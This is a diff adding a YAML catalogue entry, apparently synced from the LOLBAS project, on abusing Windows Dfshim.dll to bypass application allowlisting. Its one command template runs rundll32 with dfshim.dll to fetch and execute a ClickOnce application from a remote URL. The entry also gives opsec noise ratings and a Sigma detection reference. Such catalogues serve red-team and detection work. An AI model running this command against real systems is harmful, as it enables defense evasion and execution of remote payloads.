@@ -1,0 +1,30 @@
+id: lolbas/dfshim/awl-bypass/0
+type: library
+platform: windows
+name: Dfshim.dll
+phases:
+- defense-evasion
+- execution
+capabilities:
+- defense-evasion
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1127.002
+opsec:
+  noise: medium
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
+commands:
+- template: rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
+  comment: Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)
+references:
+- https://lolbas-project.github.io/lolbas/Libraries/Dfshim/
+tags:
+- windows
+- lolbas
